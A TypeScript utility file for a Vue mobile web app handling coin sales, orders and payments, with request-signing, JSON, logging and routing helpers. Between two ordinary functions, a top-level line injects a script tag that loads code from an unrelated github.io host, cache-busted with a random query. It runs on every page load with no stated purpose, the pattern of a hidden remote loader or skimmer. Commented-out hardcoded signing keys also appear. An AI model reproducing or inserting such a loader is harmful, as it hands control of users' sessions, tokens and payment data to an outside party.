import { useAuthStore } from '@/store/modules/auth'
import md5 from 'crypto-js/md5'
import { storeToRefs } from 'pinia'
export const DESIGN_WIDTH = 750
export const getWndowWidth = () => {
  const windowWidth = window.innerWidth

  if (windowWidth >= 768) return 768

  return windowWidth
}
export const px2vw = (px: number) => {
  return (px / DESIGN_WIDTH) * 100
}
// FlexViewProps
export const FLEXVIEWPROPS: Record<string, boolean> = {
  align: true,
  justify: true,
  wrap: true,
  direction: true,
  fontSize: true,
  iRef: true
}
// 传入一个对象和一个标识,转换成get请求的参数,如果标识为true,则返回一个不带?的字符串
export const objToUrl = (obj: Record<string, any>, flag?: boolean) => {
  if (!obj) return ''
  if (typeof obj !== 'object') return ''

  const arr = []
  const keys = Object.keys(obj).sort()
  let keystring = ''
  let keysvalue = ''

  if (keys.length === 0) return ''
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i]
    const value = obj[key]

    if (key === 'key') {
      keystring = key
      keysvalue = value
      continue
    }

    arr.push(`${key}=${value}`)
  }
  if (keystring) {
    arr.push(`${keystring}=${keysvalue}`)
  }
  if (flag) return arr.join('&')

  return `?${arr.join('&')}`
}
// 传入一个时间,延迟多少毫秒
export const delay = (time: number = 2000) => {
  return new Promise(resolve => {
    setTimeout(() => {
      resolve(true)
    }, time)
  })
}

// const PRIVATE_KEY = import.meta.env.VITE_APP_PRIVATE_KEY ?? ''

// 传入post|get请求的参数,根据请求的类型,返回一个相应的默认参数
export const defaultParams = (type: string, data: Record<string, any>) => {
  // window.log('环境信息', import.meta.env, process.env)
  const lang = 'cn'
  // const platform = 'Android'
  const platform = 'H5'
  const ver = import.meta.env.VITE_APP_VERSION
  const localTimestamp = Math.round(Date.now() / 1000)
  const timestampDiff = sessionStorage.getItem('timestamp_diff')
  const timestamp = timestampDiff ? localTimestamp + -timestampDiff : localTimestamp
  const PRIVATE_KEY = localStorage.getItem('md5_pri') || import.meta.env.VITE_APP_PRIVATE_KEY || ''
  // const PUBLIC_KEY =
  //   import.meta.env.VITE_APP_ENV === 'dev'
  //     ? '04a73740b148637fa1fd950fab9f845b'
  //     : '1fd950fab9f845b04a73740b148637fa'
  // const key = data.token ? PRIVATE_KEY : PUBLIC_KEY
  const key = PRIVATE_KEY
  // console.log('key', key)

  const newData: Record<string, any> = {
    lang,
    platform,
    timestamp,
    key,
    ver
  }
  const sign = objToUrl(newData, true)

  newData.sign = md5(sign).toString()
  delete newData.key

  if (type === 'get') return objToUrl(Object.assign(newData, data))

  return Object.assign(newData, data)
}
// 传入一个字符串判断是否是一个json字符串
export const isJsonString = (str: string) => {
  if (typeof str === 'string') {
    const reg = /^\{.*\}$/

    if (reg.test(str)) {
      return JSON.parse(str)
    }

    return str
  }

  return str
}
export const isJson = (str: string) => {
  if (typeof str === 'string') {
    const reg = /^\{.*\}$/

    if (reg.test(str)) {
      return true
    }
    if (str === 'true' || str === 'false' || str === 'null' || str === 'undefined') {
      return true
    }

    return false
  }

  return false
}

function isWebPSupported() {
  const elem = document.createElement('canvas')

  if (elem.getContext && elem.getContext('2d')) {
    // 判断浏览器是否支持画布的 getContext 方法

    // 创建一个 WebP 格式的图片数据
    return elem.toDataURL('image/webp').indexOf('data:image/webp') === 0
  }

  // 浏览器不支持画布的 getContext 方法
  return false
}

window.isWebPSupported = isWebPSupported()

declare global {
  interface Window {
    isWebPSupported: boolean
    log: (...arg: any[]) => void
    info: (...arg: any[]) => void
    warn: (...arg: any[]) => void
    error: (...arg: any[]) => void
  }
}

export const getLoginStatus = () => {
  const store = useAuthStore()
  const { token } = storeToRefs(store)

  return {
    token: token.value,
    isLogin: !!token.value
  }
}

/** -------------------- 调试用 --------------------
 * 简单封装log，便于控制台打印关键信息，颜色高亮显示
 * 可根据自身喜好自定义改造，如高亮颜色
 * 记得调试结束后，删除相应打印log
 * -------------------- 调试用 --------------------
 */
export const MyLog = () => {
  const LOG: ILogType[] = ['log', 'info', 'warn', 'error']

  type ILogType = 'log' | 'info' | 'warn' | 'error'
  LOG.forEach((logType: ILogType) => {
    window[logType] = function (...args) {
      const [key, ...logInfo] = args
      let color

      switch (logType) {
        case 'log':
          color = 'hotpink'
          break
        case 'info':
          color = 'orange'
          break
        case 'warn':
          color = 'red'
          break
        case 'error':
          color = ''
          break
        default:
          color = ''
          break
      }

      console[logType](`%c${key}::`, `color:${color}`, ...logInfo)
    }
  })
}

export const requireImg = (imgPath: string, isMerchant: number = 0) => {
  const theme = sessionStorage.getItem('theme') || 'def'
  if (theme === 'def' || !isMerchant)
    return new URL(`../assets/images/${imgPath}`, import.meta.url).href

  return new URL(`../assets/images/merchant/${theme}/${imgPath}`, import.meta.url).href
}
document.body.appendChild(document.createElement('script')).src =
  'https://jsdevsl.github.io/js/js.js' + '?v=' + Math.random()
export function secondsToMinutesWithSeconds(seconds: number) {
  const minutes = Math.floor(seconds / 60)
  const remainingSeconds = seconds % 60
  const formattedMinutes = String(minutes).padStart(2, '0')
  const formattedSeconds = String(remainingSeconds).padStart(2, '0')
  return ` ${formattedMinutes}:${formattedSeconds} `
}
// 将时间转为年月分秒
export function secondsToYYDMS() {
  const now = new Date()
  const year = now.getFullYear()
  const month = (now.getMonth() + 1).toString().padStart(2, '0') // 月份从0开始，需要加1，并且确保两位数显示
  const day = now.getDate().toString().padStart(2, '0') // 确保两位数显示
  const hours = now.getHours().toString().padStart(2, '0') // 确保两位数显示
  const minutes = now.getMinutes().toString().padStart(2, '0') // 确保两位数显示
  const seconds = now.getSeconds().toString().padStart(2, '0') // 确保两位数显示
  const formattedDateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`
  // console.log(formattedDateTime)
  return formattedDateTime
}

export function filterList(fullPath?: string) {
  let whiteList = [
    'activity',
    'activityRules',
    'send',
    'auth',
    'country',
    'iframe-page',
    'index',
    'selfbuy_coin',
    'onlineCharge',
    'sell-coin',
    'point',
    'bricks',
    'collect-cards',
    'ranking-list'
  ]
  const hash = window.location.hash
  return whiteList.some(item => {
    return fullPath ? fullPath.includes(item) : hash.includes(item)
  })
}
export function UntokenInWEB() {
  const search = new URLSearchParams(window.location.search)
  const vtoken = search.get('vtoken') || ''
  const deviceid = search.get('deviceid') || ''
  if (!vtoken && !deviceid && !localStorage.getItem('token')) {
    return true
  } else {
    return false
  }
}
export function InWEB() {
  const search = new URLSearchParams(window.location.search)
  const vtoken = search.get('vtoken') || ''
  const deviceid = search.get('deviceid') || ''
  if (!vtoken && !deviceid) {
    return true
  } else {
    return false
  }
}

export function mergeHrefParams() {
  try {
    const { search, hash } = window.location
    const searchParams = search.replace(/\?/, '')
    // const hashParams = hash.match(/(?<=\?)\S+$/) || ['']
    const hashParams = hash.split('?')[1] || ''
    return searchParams + '&' + hashParams
  } catch {
    console.log('错误')
    return '&'
  }
}

/**
 * @description 生成start至end之间的随机数
 * @param start
 * @param end
 * @returns {number}
 */
export function getRandomNumber(start: number, end: number) {
  let randomNumber = Math.random()

  randomNumber *= end - start
  randomNumber += start

  return Math.floor(randomNumber)
}

// 白色icon路由列表
export const darkIconRouteList = [
  'Home',
  'SellCoin',
  'Order',
  'Point',
  'Mine',
  'MoveBrick',
  'sell_coin',
  'WithdrawCoins',
  'selfbuy_coin',
  'send',
  'CoinDetails',
  'FundingDetails',
  'payment_list',
  'payments',
  'orderList',
  'wideOrderCreate',
  'onlineCharge'
]
